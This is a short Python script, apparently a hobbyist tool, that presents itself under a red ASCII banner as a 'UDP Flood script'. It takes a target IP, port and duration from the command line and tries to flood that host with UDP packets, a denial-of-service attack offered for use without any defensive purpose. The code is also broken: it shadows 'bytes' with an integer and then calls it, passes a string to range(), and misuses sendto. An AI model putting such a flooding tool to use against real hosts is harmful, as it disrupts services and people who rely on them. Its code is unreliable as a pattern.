############################################################
# Python 3 re-write of the old python 2 udp attack         #
############################################################

import socket, random, time, sys
from time import sleep
from colorama import Fore as F, init

init()

banner = f'''{F.RED}╦ ╦╔╦╗╔═╗   ╔╗╔╦ ╦╦  ╦  
║ ║ ║║╠═╝───║║║║ ║║  ║  
╚═╝═╩╝╩     ╝╚╝╚═╝╩═╝╩═╝''' + F.RESET

print("=" * 60)
print(banner)
print(f"{F.WHITE}=" * 60 + F.RESET)
print(f"{F.RED} UDP Flood script{F.RESET}")
print(f"{F.WHITE}=" * 60 + F.RESET)
print("")

try:
    ip = sys.argv[1]
    port = sys.argv[2]
    flood_time = sys.argv[3]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random.randint(00000, 15000)
    print(f'{F.WHITE}[{F.GREEN}+{F.WHITE}] Sending packets')
    try:
        for _ in range(flood_time):
            sock.sendto(bytes(ip,port))
    except Exception:
        print(f'{F.WHITE}[{F.RED}!{F.WHITE}] Could not send packets')
        time.sleep(2)
        exit()
except KeyboardInterrupt:
    print(f'{F.WHITE}[{F.YELLOW}!{F.WHITE}] Stopping Flood...')
    sleep(2)
    exit()